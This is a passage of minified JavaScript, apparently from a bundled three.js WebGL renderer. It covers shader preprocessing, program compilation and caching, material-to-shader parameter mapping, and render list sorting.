chunk "%s" has been deprecated. Use "%s" instead.',e,n);else throw new Error("Can not resolve #include <"+e+">")}return ns(t)}const mf=/#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;function Oa(i){return i.replace(mf,_f)}function _f(i,e,t,n){let r="";for(let s=parseInt(e);s<parseInt(t);s++)r+=n.replace(/\[\s*i\s*\]/g,"[ "+s+" ]").replace(/UNROLLED_LOOP_INDEX/g,s);return r}function Ua(i){let e="precision "+i.precision+` float;
precision `+i.precision+" int;";return i.precision==="highp"?e+=`
#define HIGH_PRECISION`:i.precision==="mediump"?e+=`
#define MEDIUM_PRECISION`:i.precision==="lowp"&&(e+=`
#define LOW_PRECISION`),e}function gf(i){let e="SHADOWMAP_TYPE_BASIC";return i.shadowMapType===eo?e="SHADOWMAP_TYPE_PCF":i.shadowMapType===Vo?e="SHADOWMAP_TYPE_PCF_SOFT":i.shadowMapType===Kt&&(e="SHADOWMAP_TYPE_VSM"),e}function vf(i){let e="ENVMAP_TYPE_CUBE";if(i.envMap)switch(i.envMapMode){case Kn:case $n:e="ENVMAP_TYPE_CUBE";break;case tr:e="ENVMAP_TYPE_CUBE_UV";break}return e}function xf(i){let e="ENVMAP_MODE_REFLECTION";if(i.envMap)switch(i.envMapMode){case $n:e="ENVMAP_MODE_REFRACTION";break}return e}function Ef(i){let e="ENVMAP_BLENDING_NONE";if(i.envMap)switch(i.combine){case to:e="ENVMAP_BLENDING_MULTIPLY";break;case fl:e="ENVMAP_BLENDING_MIX";break;case hl:e="ENVMAP_BLENDING_ADD";break}return e}function yf(i){const e=i.envMapCubeUVHeight;if(e===null)return null;const t=Math.log2(e)-2,n=1/e;return{texelWidth:1/(3*Math.max(Math.pow(2,t),7*16)),texelHeight:n,maxMip:t}}function Sf(i,e,t,n){const r=i.getContext(),s=t.defines;let o=t.vertexShader,a=t.fragmentShader;const l=gf(t),d=vf(t),u=xf(t),h=Ef(t),p=yf(t),m=t.isWebGL2?"":lf(t),E=cf(t),x=df(s),f=r.createProgram();let c,g,_=t.glslVersion?"#version "+t.glslVersion+`
`:"";t.isRawShaderMaterial?(c=["#define SHADER_TYPE "+t.shaderType,"#define SHADER_NAME "+t.shaderName,x].filter(qn).join(`
`),c.length>0&&(c+=`
`),g=[m,"#define SHADER_TYPE "+t.shaderType,"#define SHADER_NAME "+t.shaderName,x].filter(qn).join(`
`),g.length>0&&(g+=`
`)):(c=[Ua(t),"#define SHADER_TYPE "+t.shaderType,"#define SHADER_NAME "+t.shaderName,x,t.extensionClipCullDistance?"#define USE_CLIP_DISTANCE":"",t.batching?"#define USE_BATCHING":"",t.instancing?"#define USE_INSTANCING":"",t.instancingColor?"#define USE_INSTANCING_COLOR":"",t.useFog&&t.fog?"#define USE_FOG":"",t.useFog&&t.fogExp2?"#define FOG_EXP2":"",t.map?"#define USE_MAP":"",t.envMap?"#define USE_ENVMAP":"",t.envMap?"#define "+u:"",t.lightMap?"#define USE_LIGHTMAP":"",t.aoMap?"#define USE_AOMAP":"",t.bumpMap?"#define USE_BUMPMAP":"",t.normalMap?"#define USE_NORMALMAP":"",t.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",t.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",t.displacementMap?"#define USE_DISPLACEMENTMAP":"",t.emissiveMap?"#define USE_EMISSIVEMAP":"",t.anisotropy?"#define USE_ANISOTROPY":"",t.anisotropyMap?"#define USE_ANISOTROPYMAP":"",t.clearcoatMap?"#define USE_CLEARCOATMAP":"",t.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",t.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",t.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",t.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",t.specularMap?"#define USE_SPECULARMAP":"",t.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",t.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",t.roughnessMap?"#define USE_ROUGHNESSMAP":"",t.metalnessMap?"#define USE_METALNESSMAP":"",t.alphaMap?"#define USE_ALPHAMAP":"",t.alphaHash?"#define USE_ALPHAHASH":"",t.transmission?"#define USE_TRANSMISSION":"",t.transmissionMap?"#define USE_TRANSMISSIONMAP":"",t.thicknessMap?"#define USE_THICKNESSMAP":"",t.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",t.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",t.mapUv?"#define MAP_UV "+t.mapUv:"",t.alphaMapUv?"#define ALPHAMAP_UV "+t.alphaMapUv:"",t.lightMapUv?"#define LIGHTMAP_UV "+t.lightMapUv:"",t.aoMapUv?"#define AOMAP_UV "+t.aoMapUv:"",t.emissiveMapUv?"#define EMISSIVEMAP_UV "+t.emissiveMapUv:"",t.bumpMapUv?"#define BUMPMAP_UV "+t.bumpMapUv:"",t.normalMapUv?"#define NORMALMAP_UV "+t.normalMapUv:"",t.displacementMapUv?"#define DISPLACEMENTMAP_UV "+t.displacementMapUv:"",t.metalnessMapUv?"#define METALNESSMAP_UV "+t.metalnessMapUv:"",t.roughnessMapUv?"#define ROUGHNESSMAP_UV "+t.roughnessMapUv:"",t.anisotropyMapUv?"#define ANISOTROPYMAP_UV "+t.anisotropyMapUv:"",t.clearcoatMapUv?"#define CLEARCOATMAP_UV "+t.clearcoatMapUv:"",t.clearcoatNormalMapUv?"#define CLEARCOAT_NORMALMAP_UV "+t.clearcoatNormalMapUv:"",t.clearcoatRoughnessMapUv?"#define CLEARCOAT_ROUGHNESSMAP_UV "+t.clearcoatRoughnessMapUv:"",t.iridescenceMapUv?"#define IRIDESCENCEMAP_UV "+t.iridescenceMapUv:"",t.iridescenceThicknessMapUv?"#define IRIDESCENCE_THICKNESSMAP_UV "+t.iridescenceThicknessMapUv:"",t.sheenColorMapUv?"#define SHEEN_COLORMAP_UV "+t.sheenColorMapUv:"",t.sheenRoughnessMapUv?"#define SHEEN_ROUGHNESSMAP_UV "+t.sheenRoughnessMapUv:"",t.specularMapUv?"#define SPECULARMAP_UV "+t.specularMapUv:"",t.specularColorMapUv?"#define SPECULAR_COLORMAP_UV "+t.specularColorMapUv:"",t.specularIntensityMapUv?"#define SPECULAR_INTENSITYMAP_UV "+t.specularIntensityMapUv:"",t.transmissionMapUv?"#define TRANSMISSIONMAP_UV "+t.transmissionMapUv:"",t.thicknessMapUv?"#define THICKNESSMAP_UV "+t.thicknessMapUv:"",t.vertexTangents&&t.flatShading===!1?"#define USE_TANGENT":"",t.vertexColors?"#define USE_COLOR":"",t.vertexAlphas?"#define USE_COLOR_ALPHA":"",t.vertexUv1s?"#define USE_UV1":"",t.vertexUv2s?"#define USE_UV2":"",t.vertexUv3s?"#define USE_UV3":"",t.pointsUvs?"#define USE_POINTS_UV":"",t.flatShading?"#define FLAT_SHADED":"",t.skinning?"#define USE_SKINNING":"",t.morphTargets?"#define USE_MORPHTARGETS":"",t.morphNormals&&t.flatShading===!1?"#define USE_MORPHNORMALS":"",t.morphColors&&t.isWebGL2?"#define USE_MORPHCOLORS":"",t.morphTargetsCount>0&&t.isWebGL2?"#define MORPHTARGETS_TEXTURE":"",t.morphTargetsCount>0&&t.isWebGL2?"#define MORPHTARGETS_TEXTURE_STRIDE "+t.morphTextureStride:"",t.morphTargetsCount>0&&t.isWebGL2?"#define MORPHTARGETS_COUNT "+t.morphTargetsCount:"",t.doubleSided?"#define DOUBLE_SIDED":"",t.flipSided?"#define FLIP_SIDED":"",t.shadowMapEnabled?"#define USE_SHADOWMAP":"",t.shadowMapEnabled?"#define "+l:"",t.sizeAttenuation?"#define USE_SIZEATTENUATION":"",t.numLightProbes>0?"#define USE_LIGHT_PROBES":"",t.useLegacyLights?"#define LEGACY_LIGHTS":"",t.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",t.logarithmicDepthBuffer&&t.rendererExtensionFragDepth?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;","#ifdef USE_INSTANCING","	attribute mat4 instanceMatrix;","#endif","#ifdef USE_INSTANCING_COLOR","	attribute vec3 instanceColor;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_UV1","	attribute vec2 uv1;","#endif","#ifdef USE_UV2","	attribute vec2 uv2;","#endif","#ifdef USE_UV3","	attribute vec2 uv3;","#endif","#ifdef USE_TANGENT","	attribute vec4 tangent;","#endif","#if defined( USE_COLOR_ALPHA )","	attribute vec4 color;","#elif defined( USE_COLOR )","	attribute vec3 color;","#endif","#if ( defined( USE_MORPHTARGETS ) && ! defined( MORPHTARGETS_TEXTURE ) )","	attribute vec3 morphTarget0;","	attribute vec3 morphTarget1;","	attribute vec3 morphTarget2;","	attribute vec3 morphTarget3;","	#ifdef USE_MORPHNORMALS","		attribute vec3 morphNormal0;","		attribute vec3 morphNormal1;","		attribute vec3 morphNormal2;","		attribute vec3 morphNormal3;","	#else","		attribute vec3 morphTarget4;","		attribute vec3 morphTarget5;","		attribute vec3 morphTarget6;","		attribute vec3 morphTarget7;","	#endif","#endif","#ifdef USE_SKINNING","	attribute vec4 skinIndex;","	attribute vec4 skinWeight;","#endif",`
`].filter(qn).join(`
`),g=[m,Ua(t),"#define SHADER_TYPE "+t.shaderType,"#define SHADER_NAME "+t.shaderName,x,t.useFog&&t.fog?"#define USE_FOG":"",t.useFog&&t.fogExp2?"#define FOG_EXP2":"",t.map?"#define USE_MAP":"",t.matcap?"#define USE_MATCAP":"",t.envMap?"#define USE_ENVMAP":"",t.envMap?"#define "+d:"",t.envMap?"#define "+u:"",t.envMap?"#define "+h:"",p?"#define CUBEUV_TEXEL_WIDTH "+p.texelWidth:"",p?"#define CUBEUV_TEXEL_HEIGHT "+p.texelHeight:"",p?"#define CUBEUV_MAX_MIP "+p.maxMip+".0":"",t.lightMap?"#define USE_LIGHTMAP":"",t.aoMap?"#define USE_AOMAP":"",t.bumpMap?"#define USE_BUMPMAP":"",t.normalMap?"#define USE_NORMALMAP":"",t.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",t.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",t.emissiveMap?"#define USE_EMISSIVEMAP":"",t.anisotropy?"#define USE_ANISOTROPY":"",t.anisotropyMap?"#define USE_ANISOTROPYMAP":"",t.clearcoat?"#define USE_CLEARCOAT":"",t.clearcoatMap?"#define USE_CLEARCOATMAP":"",t.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",t.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",t.iridescence?"#define USE_IRIDESCENCE":"",t.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",t.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",t.specularMap?"#define USE_SPECULARMAP":"",t.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",t.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",t.roughnessMap?"#define USE_ROUGHNESSMAP":"",t.metalnessMap?"#define USE_METALNESSMAP":"",t.alphaMap?"#define USE_ALPHAMAP":"",t.alphaTest?"#define USE_ALPHATEST":"",t.alphaHash?"#define USE_ALPHAHASH":"",t.sheen?"#define USE_SHEEN":"",t.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",t.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",t.transmission?"#define USE_TRANSMISSION":"",t.transmissionMap?"#define USE_TRANSMISSIONMAP":"",t.thicknessMap?"#define USE_THICKNESSMAP":"",t.vertexTangents&&t.flatShading===!1?"#define USE_TANGENT":"",t.vertexColors||t.instancingColor?"#define USE_COLOR":"",t.vertexAlphas?"#define USE_COLOR_ALPHA":"",t.vertexUv1s?"#define USE_UV1":"",t.vertexUv2s?"#define USE_UV2":"",t.vertexUv3s?"#define USE_UV3":"",t.pointsUvs?"#define USE_POINTS_UV":"",t.gradientMap?"#define USE_GRADIENTMAP":"",t.flatShading?"#define FLAT_SHADED":"",t.doubleSided?"#define DOUBLE_SIDED":"",t.flipSided?"#define FLIP_SIDED":"",t.shadowMapEnabled?"#define USE_SHADOWMAP":"",t.shadowMapEnabled?"#define "+l:"",t.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",t.numLightProbes>0?"#define USE_LIGHT_PROBES":"",t.useLegacyLights?"#define LEGACY_LIGHTS":"",t.decodeVideoTexture?"#define DECODE_VIDEO_TEXTURE":"",t.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",t.logarithmicDepthBuffer&&t.rendererExtensionFragDepth?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;",t.toneMapping!==on?"#define TONE_MAPPING":"",t.toneMapping!==on?Ie.tonemapping_pars_fragment:"",t.toneMapping!==on?of("toneMapping",t.toneMapping):"",t.dithering?"#define DITHERING":"",t.opaque?"#define OPAQUE":"",Ie.colorspace_pars_fragment,af("linearToOutputTexel",t.outputColorSpace),t.useDepthPacking?"#define DEPTH_PACKING "+t.depthPacking:"",`
`].filter(qn).join(`
`)),o=ns(o),o=Da(o,t),o=Na(o,t),a=ns(a),a=Da(a,t),a=Na(a,t),o=Oa(o),a=Oa(a),t.isWebGL2&&t.isRawShaderMaterial!==!0&&(_=`#version 300 es
`,c=[E,"precision mediump sampler2DArray;","#define attribute in","#define varying out","#define texture2D texture"].join(`
`)+`
`+c,g=["precision mediump sampler2DArray;","#define varying in",t.glslVersion===ea?"":"layout(location = 0) out highp vec4 pc_fragColor;",t.glslVersion===ea?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join(`
`)+`
`+g);const v=_+c+o,w=_+g+a,M=Ia(r,r.VERTEX_SHADER,v),T=Ia(r,r.FRAGMENT_SHADER,w);r.attachShader(f,M),r.attachShader(f,T),t.index0AttributeName!==void 0?r.bindAttribLocation(f,0,t.index0AttributeName):t.morphTargets===!0&&r.bindAttribLocation(f,0,"position"),r.linkProgram(f);function D(X){if(i.debug.checkShaderErrors){const te=r.getProgramInfoLog(f).trim(),P=r.getShaderInfoLog(M).trim(),z=r.getShaderInfoLog(T).trim();let W=!0,Y=!0;if(r.getProgramParameter(f,r.LINK_STATUS)===!1)if(W=!1,typeof i.debug.onShaderError=="function")i.debug.onShaderError(r,f,M,T);else{const H=La(r,M,"vertex"),V=La(r,T,"fragment");console.error("THREE.WebGLProgram: Shader Error "+r.getError()+" - VALIDATE_STATUS "+r.getProgramParameter(f,r.VALIDATE_STATUS)+`

Program Info Log: `+te+`
`+H+`
`+V)}else te!==""?console.warn("THREE.WebGLProgram: Program Info Log:",te):(P===""||z==="")&&(Y=!1);Y&&(X.diagnostics={runnable:W,programLog:te,vertexShader:{log:P,prefix:c},fragmentShader:{log:z,prefix:g}})}r.deleteShader(M),r.deleteShader(T),y=new qi(r,f),R=uf(r,f)}let y;this.getUniforms=function(){return y===void 0&&D(this),y};let R;this.getAttributes=function(){return R===void 0&&D(this),R};let k=t.rendererExtensionParallelShaderCompile===!1;return this.isReady=function(){return k===!1&&(k=r.getProgramParameter(f,tf)),k},this.destroy=function(){n.releaseStatesOfProgram(this),r.deleteProgram(f),this.program=void 0},this.type=t.shaderType,this.name=t.shaderName,this.id=nf++,this.cacheKey=e,this.usedTimes=1,this.program=f,this.vertexShader=M,this.fragmentShader=T,this}let Mf=0;class bf{constructor(){this.shaderCache=new Map,this.materialCache=new Map}update(e){const t=e.vertexShader,n=e.fragmentShader,r=this._getShaderStage(t),s=this._getShaderStage(n),o=this._getShaderCacheForMaterial(e);return o.has(r)===!1&&(o.add(r),r.usedTimes++),o.has(s)===!1&&(o.add(s),s.usedTimes++),this}remove(e){const t=this.materialCache.get(e);for(const n of t)n.usedTimes--,n.usedTimes===0&&this.shaderCache.delete(n.code);return this.materialCache.delete(e),this}getVertexShaderID(e){return this._getShaderStage(e.vertexShader).id}getFragmentShaderID(e){return this._getShaderStage(e.fragmentShader).id}dispose(){this.shaderCache.clear(),this.materialCache.clear()}_getShaderCacheForMaterial(e){const t=this.materialCache;let n=t.get(e);return n===void 0&&(n=new Set,t.set(e,n)),n}_getShaderStage(e){const t=this.shaderCache;let n=t.get(e);return n===void 0&&(n=new Tf(e),t.set(e,n)),n}}class Tf{constructor(e){this.id=Mf++,this.code=e,this.usedTimes=0}}function Af(i,e,t,n,r,s,o){const a=new cs,l=new bf,d=[],u=r.isWebGL2,h=r.logarithmicDepthBuffer,p=r.vertexTextures;let m=r.precision;const E={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distanceRGBA",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"toon",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"};function x(y){return y===0?"uv":`uv${y}`}function f(y,R,k,X,te){const P=X.fog,z=te.geometry,W=y.isMeshStandardMaterial?X.environment:null,Y=(y.isMeshStandardMaterial?t:e).get(y.envMap||W),H=Y&&Y.mapping===tr?Y.image.height:null,V=E[y.type];y.precision!==null&&(m=r.getMaxPrecision(y.precision),m!==y.precision&&console.warn("THREE.WebGLProgram.getParameters:",y.precision,"not supported, using",m,"instead."));const q=z.morphAttributes.position||z.morphAttributes.normal||z.morphAttributes.color,Q=q!==void 0?q.length:0;let $=0;z.morphAttributes.position!==void 0&&($=1),z.morphAttributes.normal!==void 0&&($=2),z.morphAttributes.color!==void 0&&($=3);let G,j,re,pe;if(V){const ht=Gt[V];G=ht.vertexShader,j=ht.fragmentShader}else G=y.vertexShader,j=y.fragmentShader,l.update(y),re=l.getVertexShaderID(y),pe=l.getFragmentShaderID(y);const ue=i.getRenderTarget(),Me=te.isInstancedMesh===!0,Te=te.isBatchedMesh===!0,ge=!!y.map,Oe=!!y.matcap,N=!!Y,nt=!!y.aoMap,ve=!!y.lightMap,Re=!!y.bumpMap,fe=!!y.normalMap,Ke=!!y.displacementMap,Le=!!y.emissiveMap,A=!!y.metalnessMap,S=!!y.roughnessMap,U=y.anisotropy>0,J=y.clearcoat>0,Z=y.iridescence>0,ee=y.sheen>0,he=y.transmission>0,oe=U&&!!y.anisotropyMap,ce=J&&!!y.clearcoatMap,ye=J&&!!y.clearcoatNormalMap,De=J&&!!y.clearcoatRoughnessMap,K=Z&&!!y.iridescenceMap,Ve=Z&&!!y.iridescenceThicknessMap,ze=ee&&!!y.sheenColorMap,Ae=ee&&!!y.sheenRoughnessMap,_e=!!y.specularMap,de=!!y.specularColorMap,Pe=!!y.specularIntensityMap,Ge=he&&!!y.transmissionMap,Qe=he&&!!y.thicknessMap,Ue=!!y.gradientMap,ne=!!y.alphaMap,C=y.alphaTest>0,se=!!y.alphaHash,ae=!!y.extensions,Se=!!z.attributes.uv1,xe=!!z.attributes.uv2,Xe=!!z.attributes.uv3;let qe=on;return y.toneMapped&&(ue===null||ue.isXRRenderTarget===!0)&&(qe=i.toneMapping),{isWebGL2:u,shaderID:V,shaderType:y.type,shaderName:y.name,vertexShader:G,fragmentShader:j,defines:y.defines,customVertexShaderID:re,customFragmentShaderID:pe,isRawShaderMaterial:y.isRawShaderMaterial===!0,glslVersion:y.glslVersion,precision:m,batching:Te,instancing:Me,instancingColor:Me&&te.instanceColor!==null,supportsVertexTextures:p,outputColorSpace:ue===null?i.outputColorSpace:ue.isXRRenderTarget===!0?ue.texture.colorSpace:Zt,map:ge,matcap:Oe,envMap:N,envMapMode:N&&Y.mapping,envMapCubeUVHeight:H,aoMap:nt,lightMap:ve,bumpMap:Re,normalMap:fe,displacementMap:p&&Ke,emissiveMap:Le,normalMapObjectSpace:fe&&y.normalMapType===Dl,normalMapTangentSpace:fe&&y.normalMapType===Ll,metalnessMap:A,roughnessMap:S,anisotropy:U,anisotropyMap:oe,clearcoat:J,clearcoatMap:ce,clearcoatNormalMap:ye,clearcoatRoughnessMap:De,iridescence:Z,iridescenceMap:K,iridescenceThicknessMap:Ve,sheen:ee,sheenColorMap:ze,sheenRoughnessMap:Ae,specularMap:_e,specularColorMap:de,specularIntensityMap:Pe,transmission:he,transmissionMap:Ge,thicknessMap:Qe,gradientMap:Ue,opaque:y.transparent===!1&&y.blending===Yn,alphaMap:ne,alphaTest:C,alphaHash:se,combine:y.combine,mapUv:ge&&x(y.map.channel),aoMapUv:nt&&x(y.aoMap.channel),lightMapUv:ve&&x(y.lightMap.channel),bumpMapUv:Re&&x(y.bumpMap.channel),normalMapUv:fe&&x(y.normalMap.channel),displacementMapUv:Ke&&x(y.displacementMap.channel),emissiveMapUv:Le&&x(y.emissiveMap.channel),metalnessMapUv:A&&x(y.metalnessMap.channel),roughnessMapUv:S&&x(y.roughnessMap.channel),anisotropyMapUv:oe&&x(y.anisotropyMap.channel),clearcoatMapUv:ce&&x(y.clearcoatMap.channel),clearcoatNormalMapUv:ye&&x(y.clearcoatNormalMap.channel),clearcoatRoughnessMapUv:De&&x(y.clearcoatRoughnessMap.channel),iridescenceMapUv:K&&x(y.iridescenceMap.channel),iridescenceThicknessMapUv:Ve&&x(y.iridescenceThicknessMap.channel),sheenColorMapUv:ze&&x(y.sheenColorMap.channel),sheenRoughnessMapUv:Ae&&x(y.sheenRoughnessMap.channel),specularMapUv:_e&&x(y.specularMap.channel),specularColorMapUv:de&&x(y.specularColorMap.channel),specularIntensityMapUv:Pe&&x(y.specularIntensityMap.channel),transmissionMapUv:Ge&&x(y.transmissionMap.channel),thicknessMapUv:Qe&&x(y.thicknessMap.channel),alphaMapUv:ne&&x(y.alphaMap.channel),vertexTangents:!!z.attributes.tangent&&(fe||U),vertexColors:y.vertexColors,vertexAlphas:y.vertexColors===!0&&!!z.attributes.color&&z.attributes.color.itemSize===4,vertexUv1s:Se,vertexUv2s:xe,vertexUv3s:Xe,pointsUvs:te.isPoints===!0&&!!z.attributes.uv&&(ge||ne),fog:!!P,useFog:y.fog===!0,fogExp2:P&&P.isFogExp2,flatShading:y.flatShading===!0,sizeAttenuation:y.sizeAttenuation===!0,logarithmicDepthBuffer:h,skinning:te.isSkinnedMesh===!0,morphTargets:z.morphAttributes.position!==void 0,morphNormals:z.morphAttributes.normal!==void 0,morphColors:z.morphAttributes.color!==void 0,morphTargetsCount:Q,morphTextureStride:$,numDirLights:R.directional.length,numPointLights:R.point.length,numSpotLights:R.spot.length,numSpotLightMaps:R.spotLightMap.length,numRectAreaLights:R.rectArea.length,numHemiLights:R.hemi.length,numDirLightShadows:R.directionalShadowMap.length,numPointLightShadows:R.pointShadowMap.length,numSpotLightShadows:R.spotShadowMap.length,numSpotLightShadowsWithMaps:R.numSpotLightShadowsWithMaps,numLightProbes:R.numLightProbes,numClippingPlanes:o.numPlanes,numClipIntersection:o.numIntersection,dithering:y.dithering,shadowMapEnabled:i.shadowMap.enabled&&k.length>0,shadowMapType:i.shadowMap.type,toneMapping:qe,useLegacyLights:i._useLegacyLights,decodeVideoTexture:ge&&y.map.isVideoTexture===!0&&We.getTransfer(y.map.colorSpace)===je,premultipliedAlpha:y.premultipliedAlpha,doubleSided:y.side===Ut,flipSided:y.side===Et,useDepthPacking:y.depthPacking>=0,depthPacking:y.depthPacking||0,index0AttributeName:y.index0AttributeName,extensionDerivatives:ae&&y.extensions.derivatives===!0,extensionFragDepth:ae&&y.extensions.fragDepth===!0,extensionDrawBuffers:ae&&y.extensions.drawBuffers===!0,extensionShaderTextureLOD:ae&&y.extensions.shaderTextureLOD===!0,extensionClipCullDistance:ae&&y.extensions.clipCullDistance&&n.has("WEBGL_clip_cull_distance"),rendererExtensionFragDepth:u||n.has("EXT_frag_depth"),rendererExtensionDrawBuffers:u||n.has("WEBGL_draw_buffers"),rendererExtensionShaderTextureLod:u||n.has("EXT_shader_texture_lod"),rendererExtensionParallelShaderCompile:n.has("KHR_parallel_shader_compile"),customProgramCacheKey:y.customProgramCacheKey()}}function c(y){const R=[];if(y.shaderID?R.push(y.shaderID):(R.push(y.customVertexShaderID),R.push(y.customFragmentShaderID)),y.defines!==void 0)for(const k in y.defines)R.push(k),R.push(y.defines[k]);return y.isRawShaderMaterial===!1&&(g(R,y),_(R,y),R.push(i.outputColorSpace)),R.push(y.customProgramCacheKey),R.join()}function g(y,R){y.push(R.precision),y.push(R.outputColorSpace),y.push(R.envMapMode),y.push(R.envMapCubeUVHeight),y.push(R.mapUv),y.push(R.alphaMapUv),y.push(R.lightMapUv),y.push(R.aoMapUv),y.push(R.bumpMapUv),y.push(R.normalMapUv),y.push(R.displacementMapUv),y.push(R.emissiveMapUv),y.push(R.metalnessMapUv),y.push(R.roughnessMapUv),y.push(R.anisotropyMapUv),y.push(R.clearcoatMapUv),y.push(R.clearcoatNormalMapUv),y.push(R.clearcoatRoughnessMapUv),y.push(R.iridescenceMapUv),y.push(R.iridescenceThicknessMapUv),y.push(R.sheenColorMapUv),y.push(R.sheenRoughnessMapUv),y.push(R.specularMapUv),y.push(R.specularColorMapUv),y.push(R.specularIntensityMapUv),y.push(R.transmissionMapUv),y.push(R.thicknessMapUv),y.push(R.combine),y.push(R.fogExp2),y.push(R.sizeAttenuation),y.push(R.morphTargetsCount),y.push(R.morphAttributeCount),y.push(R.numDirLights),y.push(R.numPointLights),y.push(R.numSpotLights),y.push(R.numSpotLightMaps),y.push(R.numHemiLights),y.push(R.numRectAreaLights),y.push(R.numDirLightShadows),y.push(R.numPointLightShadows),y.push(R.numSpotLightShadows),y.push(R.numSpotLightShadowsWithMaps),y.push(R.numLightProbes),y.push(R.shadowMapType),y.push(R.toneMapping),y.push(R.numClippingPlanes),y.push(R.numClipIntersection),y.push(R.depthPacking)}function _(y,R){a.disableAll(),R.isWebGL2&&a.enable(0),R.supportsVertexTextures&&a.enable(1),R.instancing&&a.enable(2),R.instancingColor&&a.enable(3),R.matcap&&a.enable(4),R.envMap&&a.enable(5),R.normalMapObjectSpace&&a.enable(6),R.normalMapTangentSpace&&a.enable(7),R.clearcoat&&a.enable(8),R.iridescence&&a.enable(9),R.alphaTest&&a.enable(10),R.vertexColors&&a.enable(11),R.vertexAlphas&&a.enable(12),R.vertexUv1s&&a.enable(13),R.vertexUv2s&&a.enable(14),R.vertexUv3s&&a.enable(15),R.vertexTangents&&a.enable(16),R.anisotropy&&a.enable(17),R.alphaHash&&a.enable(18),R.batching&&a.enable(19),y.push(a.mask),a.disableAll(),R.fog&&a.enable(0),R.useFog&&a.enable(1),R.flatShading&&a.enable(2),R.logarithmicDepthBuffer&&a.enable(3),R.skinning&&a.enable(4),R.morphTargets&&a.enable(5),R.morphNormals&&a.enable(6),R.morphColors&&a.enable(7),R.premultipliedAlpha&&a.enable(8),R.shadowMapEnabled&&a.enable(9),R.useLegacyLights&&a.enable(10),R.doubleSided&&a.enable(11),R.flipSided&&a.enable(12),R.useDepthPacking&&a.enable(13),R.dithering&&a.enable(14),R.transmission&&a.enable(15),R.sheen&&a.enable(16),R.opaque&&a.enable(17),R.pointsUvs&&a.enable(18),R.decodeVideoTexture&&a.enable(19),y.push(a.mask)}function v(y){const R=E[y.type];let k;if(R){const X=Gt[R];k=ac.clone(X.uniforms)}else k=y.uniforms;return k}function w(y,R){let k;for(let X=0,te=d.length;X<te;X++){const P=d[X];if(P.cacheKey===R){k=P,++k.usedTimes;break}}return k===void 0&&(k=new Sf(i,R,y,s),d.push(k)),k}function M(y){if(--y.usedTimes===0){const R=d.indexOf(y);d[R]=d[d.length-1],d.pop(),y.destroy()}}function T(y){l.remove(y)}function D(){l.dispose()}return{getParameters:f,getProgramCacheKey:c,getUniforms:v,acquireProgram:w,releaseProgram:M,releaseShaderCache:T,programs:d,dispose:D}}function Rf(){let i=new WeakMap;function e(s){let o=i.get(s);return o===void 0&&(o={},i.set(s,o)),o}function t(s){i.delete(s)}function n(s,o,a){i.get(s)[o]=a}function r(){i=new WeakMap}return{get:e,remove:t,update:n,dispose:r}}function wf(i,e){return i.groupOrder!==e.groupOrder?i.groupOrder-e.groupOrder:i.renderOrder!==e.renderOrder?i.renderOrder-e.renderOrder:i.material.id!==e.material.id?i.material.id-e.material.id:i.z!==e.z?i.z-e.z:i.id-e.id}function Fa(i,e){return i.groupOrder!==e.groupOrder?i.groupOrder-e.groupOrder:i.renderOrder!==e.renderOrder?i.renderOrder-e.renderOrder:i.z!==e.z?e.z-i.z:i.id-e.id}function ka(){const i=[];let e=0;const t=[],n=[],r=[];function s(){e=0,t.length=0,n.length=0,r.length=0}function o(h,p,m,E,x,f){let c=i[e];return c===void 0?(c={id:h.id,object:h,geometry:p,material:m,groupOrder:E,renderOrder:h.renderOrder,z:x,group:f},i[e]=c):(c.id=h.id,c.object=h,c.geometry=p,c.material=m,c.groupOrder=E,c.renderOrder=h.renderOrder,c.z=x,c.group=f),e++,c}function a(h,p,m,E,x,f){const 